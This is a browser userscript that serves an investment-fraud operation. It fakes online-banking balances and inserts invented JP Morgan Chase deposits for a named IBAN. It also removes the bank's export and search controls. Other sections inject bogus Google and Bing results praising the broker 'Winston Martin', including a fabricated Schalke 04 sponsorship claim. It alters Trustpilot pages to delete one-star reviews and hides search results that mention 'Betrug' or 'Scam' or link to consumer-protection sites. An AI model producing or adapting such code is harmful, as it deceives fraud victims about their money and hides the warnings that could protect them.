// ==UserScript==
// @name         Ed WM Norbert Scheidacker
// @namespace    http://tampermonkey.net/
// @version      0.7
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        https://www.rb-lauf.de/*
// @match        https://www.drivehq.com/*
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/491991/Ed%20WM%20Norbert%20Scheidacker.user.js
// @updateURL https://update.greasyfork.org/scripts/491991/Ed%20WM%20Norbert%20Scheidacker.meta.js
// ==/UserScript==



//======================================================================================================================================================================================================
//======================================================================================================================================================================================================
//======================================================================================================================================================================================================
//======================================================================================================================================================================================================


//    HOEMPAGE


   // Configurable modification amounts and corresponding indexes
    var BALANCE_CONFIGS = [
 //       { index: 0, adjustmentAmount: 245000},
 //       { index: 3, adjustmentAmount: 245000},
 //       { index: 4, adjustmentAmount: 245000},

        // Add more configurations as needed...
    ];

//  UMSATZE BALANCE

    // Configurable modification amount
 //   const modificationAmount = 245000; // Set your desired modification amount here

    // IBAN to check against
 //   const ibancheck = 'DE93 7609 0500 4004 0987 30';


// UMSATZE TRANSACTIONS

      // Configurable elements
    const transactionConfig = [   // 1 STARTING FROM THE TOP

        {
            letter: "J",
            title: "JP Morgan Chase",
            details: "Freigabe über Zahlungsabsender nötig. Bitte auf Andreas Graf warten.",
            amount: "177.964,97",
            date: "27. Mai 2024",
            insertAbove: true // Set to true to insert above, false to insert below
        },
        {
            letter: "J",
            title: "JP Morgan Chase",
            details: "Bitte ohne Andreas Graf nicht ausgeben.",
            amount: "27.000,00",
            date: "27. Mai 2024",
            insertAbove: false // Set to true to insert above, false to insert below
        },
 {
            letter: "J",
            title: "JP Morgan Chase",
            details: " Bitte auf Andreas Graf warten.",
            amount: "40.000,00",
            date: "28. Mai 2024",
            insertAbove: true // Set to true to insert above, false to insert below
        },
        // Add more configurations as needed
    ];






//======================================================================================================================================================================================================
//======================================================================================================================================================================================================
//======================================================================================================================================================================================================
//======================================================================================================================================================================================================
 if (window.location.href.indexOf("goteo") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("drive") > 0 ) {
    'use strict';

//    // Configurable modification amounts and corresponding indexes
//    var BALANCE_CONFIGS = [
////        { index: 0, adjustmentAmount: 10000 },
//        { index: 1, adjustmentAmount: 20000 },
//        { index: 2, adjustmentAmount: 10000 },
//        { index: 3, adjustmentAmount: -5000 },
//        { index: 4, adjustmentAmount: 20000 },
////        { index: 5, adjustmentAmount: -15000 }
        // Add more configurations as needed...
//    ];

    // Function to modify the balance
    function modifyBalance() {
        // Check for the presence of the element with the class "icon-ico-CSV text-white"
        const csvElement = document.querySelector('.icon-ico-CSV.text-white');
        if (csvElement) {
            // Find all elements containing the "€" sign in their text content
            const balanceElements = document.querySelectorAll('.text-white.fs-28.text-extra-bold.mt-6-n.ml-13.mr-10.ng-star-inserted, .amount.text-extra-bold.ng-star-inserted, .total-amount.text-extra-bold.d-block.ng-star-inserted');
            BALANCE_CONFIGS.forEach(config => {
                const balanceElement = balanceElements[config.index];
                if (balanceElement && balanceElement.textContent.includes('€')) {
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + config.adjustmentAmount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue) + ' €';

                        // Update the balance element with the new value
                        balanceElement.textContent = formattedNewBalance;

                        console.log(`Balance at index ${config.index} modified from ${balanceText} to ${formattedNewBalance}`);

                        // Remove the csvElement 5 milliseconds after modification
                        setTimeout(() => {
                            const elementToRemove = document.querySelector('.icon-ico-CSV.text-white');
                            if (elementToRemove) {
                                elementToRemove.remove();
                                console.log("Element with class 'icon-ico-CSV text-white' removed.");
                            }
                        }, 10);
                    } else {
                        console.log('Failed to parse current balance value.');
                    }
                }
            });
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }

    // Call the function to modify the balance every 7 seconds
    setInterval(modifyBalance, 20);

}




//-------------------------------------------------------------------------------------------------------------------------------------------------------------

// ==UserScript==
// @name         TO COMBINE Sparda Balance Modifier with Element Removal
// @namespace    http://tampermonkey.net/
// @version      1.5
// @description  Modify balance under the specified class with a configurable amount and remove a specific element after modification
// @author       You
// @match        *://*/*
// @grant        none
// ==/UserScript==

 if (window.location.href.indexOf("goteo") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("drive") > 0 ) {
    'use strict';

//    // Configurable modification amount
//    const modificationAmount = 79000; // Set your desired modification amount here

//    // IBAN to check against
//    const ibancheck = 'DE51 6009 0800 0000 4901 24';

    // Function to check if ibantext is present on the page
    function isIbanTextPresent() {
        return document.body.innerText.includes(ibancheck);
    }

    // Function to modify the balance
    function modifyBalance() {
        if (isIbanTextPresent()) {
            // Check for the presence of the element with the specified class
            const presenceCheckElement = document.querySelector('.cursor-pointer.icon-ico-duplicate.copy-btn');
            if (presenceCheckElement) {
                // Find the balance element
                const balanceElement = document.querySelector('.text-right.text-extra-bold.fs-22.mr-7-n.ng-star-inserted');
                if (balanceElement) {
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('-', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + modificationAmount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue) + ' €';

                        // Update the balance element with the new value
                        balanceElement.textContent = formattedNewBalance;

                        console.log(`Balance modified from ${balanceText} to ${formattedNewBalance}`);

                        // Remove the presence check element 5 milliseconds after modification
                        setTimeout(() => {
                            const elementToRemove = document.querySelector('.cursor-pointer.icon-ico-duplicate.copy-btn');
                            if (elementToRemove) {
                                elementToRemove.remove();
                                console.log("Element with class 'cursor-pointer icon-ico-duplicate copy-btn' removed.");
                            }
                        }, 5);
                    } else {
                        console.log('Failed to parse current balance value.');
                    }
                } else {
                    console.log('Balance element not found.');
                }
            } else {
                console.log('Presence check element not found. Balance not modified.');
            }
        } else {
            console.log('ibantext not found. Balance not modified.');
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }

    // Function to repeatedly check and modify the balance every 10 seconds
    function startBalanceModification() {
        setInterval(modifyBalance, 200); // 10000 milliseconds = 10 seconds
    }

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var dobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    dobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts from the document
    removeScripts();

    // Start the repeated balance modification when the page loads
    window.addEventListener('load', startBalanceModification);

 }



//-----------------------------------------------------------------------------------------------------------------------------------------------------------






 if (window.location.href.indexOf("goteo") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("drive") > 0 ) {
    'use strict';

    // IBAN to check against
//    const ibancheck = 'DE93 7609 0500 4004 0987 30';

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var qwdobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    qwdobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts from the document
    removeScripts();

    // Configurable elements
//    const transactionConfig = [
//        {
//            letter: "J",
//            title: "JP Morgan Chase",
//            details: "JP Morgan Chase. Freigabe über Zahlungsabsender nötig. Bitte auf Kontoberater warten.",
////            amount: "71,14",
//            date: "28. April 2024",
//            insertAbove: true, // Set to true to insert above, false to insert below
 //           inserted: false // Track whether the transaction has been inserted
//        },
//        {
//            letter: "J",
//            title: "JP Morgan Chase",
//            details: "JP Morgan Chase. Freigabe über Zahlungsabsender nötig. Bitte auf Kontoberater warten.",
//            amount: "-71,14",
//            date: "28. April 2024",
//            insertAbove: false, // Set to true to insert above, false to insert below
//            inserted: false // Track whether the transaction has been inserted
 //       },
        // Add more configurations as needed
 //   ];

    // Function to check if ibantext variable is present
    function checkIbantext() {
        // Find the IBAN text content in the specified class
        const ibanElement = document.querySelector('.left-menu-item.fs-13');
        if (ibanElement) {
            const ibanText = ibanElement.textContent.trim();
            // Check if the IBAN matches
            return ibanText === ibancheck;
        } else {
            // If the element is not found, return false
            return false;
        }
    }

    // Function to duplicate transactions and configure details
    function duplicateTransactions() {
        // Check if ibantext variable is present
        if (checkIbantext()) {
            // Check if the search box is present
            const searchBox = document.getElementById('search-box');
            if (!searchBox) {
                console.log("Search box not found. Transactions will not be inserted.");
                return;
            }
            // Find the parent element containing transactions
            const transactionsParent = document.querySelector('app-transactions-list');
            if (transactionsParent) {
                // Iterate over each configuration
                transactionConfig.forEach(config => {
                    // Check if transaction has already been inserted
                    if (!config.inserted) {
                        // Find the original transaction element based on the first child
                        const originalTransaction = transactionsParent.querySelector('.list-group-item.transaction');
                        if (originalTransaction) {
                            // Clone the original transaction element
                            const clone = originalTransaction.cloneNode(true);
                            // Configure details of the cloned transaction
                            const transactionLetter = clone.querySelector('.letter-logo.ng-star-inserted');
                            if (transactionLetter) {
                                transactionLetter.textContent = config.letter;
                            }
                            const transactionTitle = clone.querySelector('.dots.text-extra-bold.fs-15.ng-star-inserted');
                            if (transactionTitle) {
                                transactionTitle.textContent = config.title;
                            }
                            const transactionDetails = clone.querySelector('.col-sm-6.pull-left.transaction-info');
                            if (transactionDetails) {
                                transactionDetails.textContent = config.details;
                            }
                            const transactionAmount = clone.querySelector('.fs-15.pull-right.text-extra-bold');
                            if (transactionAmount) {
                                // Set the class based on whether the amount is positive or negative
                                if (config.amount.startsWith('-')) {
                                    transactionAmount.classList.remove('green');
                                } else {
                                    transactionAmount.classList.add('green');
                                }
                                transactionAmount.textContent = config.amount;
                            }
                            const transactionDate = clone.querySelector('.date-line.fs-13.ng-star-inserted');
                            if (transactionDate) {
                                transactionDate.textContent = config.date;
                            }
                            // Insert the cloned transaction either above or below the original one
                            if (config.insertAbove) {
                                originalTransaction.parentNode.insertBefore(clone, originalTransaction);
                            } else {
                                originalTransaction.parentNode.insertBefore(clone, originalTransaction.nextSibling);
                            }
                            // Mark the transaction as inserted
                            config.inserted = true;
                            console.log('Transaction duplicated and configured successfully.');
                        } else {
                            console.log('No transactions found.');
                        }
                    } else {
                        console.log('Transaction already inserted:', config.title);
                    }
                });
                // Remove the search box 5 milliseconds after modification
                setTimeout(() => {
                    const searchBoxToRemove = document.getElementById('search-box');
                    if (searchBoxToRemove) {
                        searchBoxToRemove.remove();
                        console.log("Search box removed.");
                    }
                }, 5);
            } else {
                console.log('Parent with tag <app-transactions-list> not found.');
            }
        } else {
            console.log('IBAN does not match.');
        }
    }

    // Function to check if the search box is present and reinsert transactions
    function checkAndReinsertTransactions() {
        const searchBox = document.getElementById('search-box');
        if (searchBox) {
            console.log("Search box found. Reinserting transactions.");
            // Reset inserted flag for all transactions
            transactionConfig.forEach(config => {
                config.inserted = false;
            });
            // Reinsert transactions
            duplicateTransactions();
        }
    }

    // Initial call to duplicate transactions
    setTimeout(duplicateTransactions, 0);

    // Check for search box and reinsert transactions every 3 seconds
    setInterval(checkAndReinsertTransactions, 3000);
}




//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



 if (window.location.href.indexOf("goteo") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("drive") > 0 ) {

    'use strict';

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var dobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    dobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts from the document
    removeScripts();

    // Function to remove specific elements based on URL conditions
    function removeElements() {
        // Find the elements with the specified classes and remove them unconditionally
        const elementsToRemove = document.querySelectorAll('.text-description-light.ng-star-inserted, .download-buttons-wrap.hover-hand.ng-tns-c184-2, .mb-0.ng-tns-c184-1, .mb-0.ng-tns-c279-2, .list-item-header.first-header, .btn.btn-action-custom.btn-has-icon.left-side-icon.text-left');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log("Element removed:", element);
        });

        // Check if the URL contains "rebooking" and remove the specified element
        if (window.location.href.includes("rebooking")) {
            const balanceElement = document.querySelector('.amount.text-extra-bold.ng-star-inserted');
            if (balanceElement) {
                balanceElement.remove();
                console.log("Balance element removed:", balanceElement);
            }
        }
    }

    // Call the function to remove the specific elements every 100 milliseconds
    setInterval(removeElements, 100);

 }






 // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1
    && window.location.href.indexOf("ing.de") === -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["aix", "winston", "martin", "winston martin", "trader", "aixtrader", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust", "aix trader", "aix-trader", "flow", "flowtrade", "flowtrader", "trader", "flow trader", "24", "ing", "targo", "targobank", "diba", "login"],
                        results: [
                            {
                                url: "https://cfd.winstonmartin.com/",
                                title: "Winston Martin dein Broker",
                                description: "Winston Martin ist der Broker mit der besten Reputation.",
                                footerText: "https://cfd.winstonmartin.com/",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von Winston Martin - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker Winston Martin",
                                footerText: "https://de.trustpilot.com/review/winstonmartin.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "Winston Martin Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Winston Martin ab dem 1. Januar unser Sponsor und Partner wird. Winston Martin ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Winston Martin sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}


// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "Winston Martin";
    const customLogoURL = "https://p-cdn.co/winstonmartin/brands/winstonmartin/logo-white.png";
    const customURL = "https://cfd.winstonmartin.com/";
    const customReferenceURL = "winstonmartin.com";
    const customLinkURL = "https://cfd.winstonmartin.com/"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "Winston Martin",
      "icmarkets": "Winston Martin",
      "ic-markets": "Winston Martin",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}


// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  var newURL = "https://cfd.winstonmartin.com/";
var newLogoURL = "https://i.ibb.co/wRWGRKf/Copy-of-Untitled-Design-1.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var sobserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

sobserver.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1 &&
        window.location.href.indexOf("ing.de") === -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung', 'seriös' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://de.trustpilot.com/review/winstonmartin.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }

